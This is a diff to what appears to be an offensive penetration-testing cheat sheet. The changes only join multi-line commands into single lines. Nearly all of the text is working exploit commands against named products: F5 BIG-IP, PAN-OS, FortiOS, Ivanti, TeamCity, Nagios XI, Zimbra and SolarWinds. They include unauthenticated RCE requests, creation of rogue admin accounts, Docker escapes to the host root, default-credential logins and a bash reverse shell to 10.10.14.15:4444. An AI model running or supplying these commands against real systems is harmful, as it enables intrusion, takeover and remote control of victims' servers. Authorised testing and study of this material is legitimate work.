@@ -735,8 +735,7 @@ python3 CVE-2019-15949.py -t http://target.com/nagiosxi -u nagiosadmin -p nagios
 ```bash
 # Multiple unauthenticated/authenticated SQL injection points
 # /nagiosxi/admin/banner_message-ajaxhelper.php — no auth required
-sqlmap -u 'http://target.com/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=1' \
-  --batch --dbs
+sqlmap -u 'http://target.com/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=1' --batch --dbs
 ```
 
 **Post-auth RCE via plugin upload (any version with admin access):**
@@ -902,12 +901,7 @@ nmap -sV -p 443,8443,22 target.com
 
 ```bash
 # CVE-2022-1388 — Unauthenticated RCE via iControl REST API (BIG-IP 16.1.x < 16.1.2.2, etc.)
-curl -sk -X POST https://target.com/mgmt/tm/util/bash \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Basic YWRtaW46" \
-  -H "X-F5-Auth-Token: a" \
-  -H "Connection: keep-alive, X-F5-Auth-Token" \
-  -d '{"command":"run","utilCmdArgs":"-c id"}'
+curl -sk -X POST https://target.com/mgmt/tm/util/bash -H "Content-Type: application/json" -H "Authorization: Basic YWRtaW46" -H "X-F5-Auth-Token: a" -H "Connection: keep-alive, X-F5-Auth-Token" -d '{"command":"run","utilCmdArgs":"-c id"}'
 
 # PoC with shell
 python3 CVE-2022-1388.py -t https://target.com
@@ -944,8 +938,7 @@ curl -sk 'https://target.com/dana-na/../dana/html5acc/guacamole/../../../data/ru
 python3 CVE-2021-22893.py -t https://target.com
 
 # CVE-2023-46805 + CVE-2024-21887 — Auth bypass + command injection (Ivanti ICS/IPS < 22.3.x)
-curl -sk 'https://target.com/api/v1/totp/user-backup-code/../../license/keys-status/' \
-  -H "X-SNS-Header: ;;;id"
+curl -sk 'https://target.com/api/v1/totp/user-backup-code/../../license/keys-status/' -H "X-SNS-Header: ;;;id"
 
 # Ivanti DSM (Desktop & Server Management) — CVE-2023-38035
 # Unauthenticated access to Sentry admin portal
@@ -976,9 +969,7 @@ curl -sk https://target.com/php/login.php -I
 ```bash
 # CVE-2024-3400 — Unauthenticated OS command injection via GlobalProtect (PAN-OS < 11.1.2-h3)
 # Requires GlobalProtect gateway or portal enabled
-curl -sk 'https://target.com/ssl-vpn/hipreport.esp' \
-  -b 'SESSID=/../../../opt/paloaltonetworks/gp/var/log/gp/gpd.log' \
-  --data 'user=;id>/tmp/pwned;'
+curl -sk 'https://target.com/ssl-vpn/hipreport.esp' -b 'SESSID=/../../../opt/paloaltonetworks/gp/var/log/gp/gpd.log' --data 'user=;id>/tmp/pwned;'
 
 # Full PoC
 python3 CVE-2024-3400.py -t https://target.com -c "bash -i >& /dev/tcp/10.10.14.15/4444 0>&1"
@@ -1004,10 +995,7 @@ curl -sk https://target.com/remote/login | grep -i "fortinet\|fortigate\|version
 ```bash
 # CVE-2022-40684 — Auth bypass on FortiOS/FortiProxy/FortiSwitchManager admin interface
 # Add admin account without authentication
-curl -sk -X PUT 'https://target.com/api/v2/cmdb/system/admin/admin' \
-  -H 'User-Agent: Report Runner' \
-  -H 'Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";' \
-  -d '{"ssh-public-key1":"ssh-rsa AAAA..."}'
+curl -sk -X PUT 'https://target.com/api/v2/cmdb/system/admin/admin' -H 'User-Agent: Report Runner' -H 'Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";' -d '{"ssh-public-key1":"ssh-rsa AAAA..."}'
 
 # CVE-2023-27997 — Heap overflow RCE in SSL-VPN (FortiOS < 6.0.17/6.2.15/6.4.13/7.0.12/7.2.5)
 # Pre-auth, no interaction required
@@ -1090,10 +1078,7 @@ curl -s http://target.com:8111/app/rest/server   # version info (may require aut
 
 ```bash
 # CVE-2024-27198 — Auth bypass → admin account creation (TeamCity < 2023.11.4)
-curl -s -X POST 'http://target.com:8111/app/rest/users' \
-  -H 'Content-Type: application/json' \
-  --path-as-is '/app/rest/users;.jsp' \
-  -d '{"username":"hacker","password":"Hacker123!","email":"h@h.com","roles":{"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}}'
+curl -s -X POST 'http://target.com:8111/app/rest/users' -H 'Content-Type: application/json' --path-as-is '/app/rest/users;.jsp' -d '{"username":"hacker","password":"Hacker123!","email":"h@h.com","roles":{"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}}'
 
 python3 CVE-2024-27198.py -t http://target.com:8111
 
@@ -1121,17 +1106,13 @@ curl http://target.com:2375/v1.41/containers/json
 
 # Escape via privileged container / docker socket
 # If you have access to /var/run/docker.sock inside a container:
-docker -H unix:///var/run/docker.sock run -it --rm \
-  --privileged --pid=host \
-  alpine nsenter -t 1 -m -u -n -i sh
+docker -H unix:///var/run/docker.sock run -it --rm --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh
 
 # Mount host root filesystem
-docker -H unix:///var/run/docker.sock run -it --rm \
-  -v /:/host alpine chroot /host sh
+docker -H unix:///var/run/docker.sock run -it --rm -v /:/host alpine chroot /host sh
 
 # From outside — RCE via exposed API
-docker -H tcp://target.com:2375 run -it --rm \
-  -v /:/host alpine chroot /host sh
+docker -H tcp://target.com:2375 run -it --rm -v /:/host alpine chroot /host sh
 ```
 
 ### Kubernetes
@@ -1202,8 +1183,7 @@ python3 CVE-2022-41352.py -t target.com -l 10.10.14.15 -p 4444
 # CVE-2023-37580 — Reflected XSS → session steal (Zimbra < 8.8.15.p41)
 
 # Default admin creds check
-curl -sk -X POST 'https://target.com:7071/service/admin/soap' \
-  -d '<AuthRequest xmlns="urn:zimbraAdmin"><name>admin</name><password>zimbra</password></AuthRequest>'
+curl -sk -X POST 'https://target.com:7071/service/admin/soap' -d '<AuthRequest xmlns="urn:zimbraAdmin"><name>admin</name><password>zimbra</password></AuthRequest>'
 
 # Post-auth webshell path
 # Zimbra webroot: /opt/zimbra/jetty/webapps/zimbra/
@@ -1233,9 +1213,7 @@ curl -sk 'https://target.com:8787/WebResource.axd?SolarWindsOrionAccountID=Admin
 # Post-auth RCE via Orion Job Scheduler
 # Settings → Manage Jobs → Create job → execute PowerShell
 # Or via the Orion API:
-curl -sk -X POST 'https://target.com:17778/SolarWinds/InformationService/v3/Json/Query' \
-  -u admin:admin \
-  -d '{"query":"SELECT * FROM Orion.Nodes"}'
+curl -sk -X POST 'https://target.com:17778/SolarWinds/InformationService/v3/Json/Query' -u admin:admin -d '{"query":"SELECT * FROM Orion.Nodes"}'
 
 # SUNBURST/SUNSPOT context — if you find Orion, assume it has broad network visibility
 # Check connected agents — Orion has WMI/SNMP/SSH access to monitored hosts
